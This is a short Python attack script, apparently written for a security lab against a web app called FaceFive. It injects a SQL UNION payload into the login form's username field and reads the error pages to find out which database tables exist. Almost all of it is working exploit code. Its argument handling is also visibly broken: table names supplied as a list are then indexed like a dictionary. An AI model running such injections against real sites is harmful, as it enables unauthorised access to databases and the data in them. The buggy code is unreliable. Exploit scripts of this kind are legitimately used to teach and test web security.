#!/usr/bin/env python3
import requests, sys
from interface import *
from bs4 import BeautifulSoup

if not (2 <= len(sys.argv)):
    print(f"Usage: {__file__} server_url [table_names...]")
    sys.exit(-1)

url = sys.argv[1]

tables = { # "table_name": exists
    "Users":  True,
    "Friends": True,
    "Searchs": False,
    "Posts":  True,
    "FriendsRequests":  True,
    "Images": False
}

if len(sys.argv) > 2:
    tables = sys.argv[2:]
else:
    print("[*] Using default tables. You can change them by writing the table names as arguments")

def check_table(s, tablename):
    payload = f"' UNION SELECT * from {tablename}#"
    r = login(s, url, username=payload, password="asdf")
    soup = BeautifulSoup(r.text, 'html.parser')
    title = soup.find_all("title")[0].string

    if title == "ErrorFaceFive": # If we get an error, the table does not exist
        error = soup.find_all("h4")[0].string
        error_msg = f"(1146, \"Table \'facefivedb.{tablename}\' doesn\'t exist\")"
        if error == error_msg:
            return False

    return True

session = requests.Session()
reset_app(session, url)

# Checking the existence of the tables
for table_name in tables:
    assert check_table(session, table_name) == tables[table_name]
    if (tables[table_name]):
        print(f"[+] Table {table_name} exists")
    else:
        print(f"[+] Table {table_name} doesn't exists")

session.close()
